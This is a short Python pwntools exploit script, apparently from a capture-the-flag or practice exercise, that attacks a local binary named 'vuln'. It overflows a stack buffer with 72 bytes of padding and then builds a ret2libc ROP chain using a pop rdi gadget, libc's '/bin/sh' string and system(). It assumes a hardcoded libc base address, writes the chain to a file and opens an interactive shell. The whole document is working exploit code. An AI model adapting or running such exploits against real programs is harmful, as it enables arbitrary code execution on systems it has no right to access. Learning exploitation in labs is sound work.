#!/usr/bin/python3

from pwn import *
from struct import pack

# starting gdb with our binary and continuing execution
# p = gdb.debug('./vuln', '''
#     b *0x401184
#     c
# ''') 
p = process('./vuln') 

binary = ELF('./vuln') # loading the binary into pwntools
context.binary = binary # setting up all pwntool settings suited for the binary
rop = ROP(binary) # loading our binary to look for gadgets and building rop chains
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
p.recvuntil(b"buffer:") # we tell pwntools to wait until it receives the string in stdout

libc.address = 0x00007ffff7dc4000
rop.raw(b"A"*72)  # Overflow
#rop.raw(pack("<I",0xdeadbeef)) 
rop.raw(0x40114a) # pop rdi
rop.raw(next(libc.search(b'/bin/sh')))  # Search for the string /bin/sh
rop.raw(0x40114b)
rop.raw(libc.symbols['system'])

# Generate the ROP chain
rop_chain = rop.chain()

# Write the ROP chain to a file
with open('rop_chain.txt', 'wb') as f:
    f.write(rop_chain)

p.sendline(rop_chain)
#p.sendline(rop.chain())
p.interactive() # to continue interacting with pythonpwn